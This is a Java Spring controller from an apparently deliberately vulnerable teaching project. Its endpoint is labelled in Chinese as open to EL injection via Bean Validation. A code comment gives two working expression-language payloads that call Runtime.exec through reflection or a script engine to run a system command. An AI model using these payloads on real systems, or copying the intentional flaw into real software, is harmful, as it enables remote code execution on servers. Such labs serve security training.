package com.example.vulnerablejava.controller;

import javax.validation.Valid;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.example.vulnerablejava.entity.Image;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "EL注入漏洞")
@RestController
@RequestMapping("el")
public class ELController {

    /**
     * 存在EL注入漏洞，BeanValidation RCE，
     *
     * 攻击者传入?url=${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}
     * 即可执行系统命令
     *
     * 或 ?url=${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
     *
     */
    @ApiOperation("存在漏洞")
    @GetMapping("1")
    public String getImage(@Valid Image image) {
        String url = image.getUrl();
        return "The image url is " + url;
    }
}
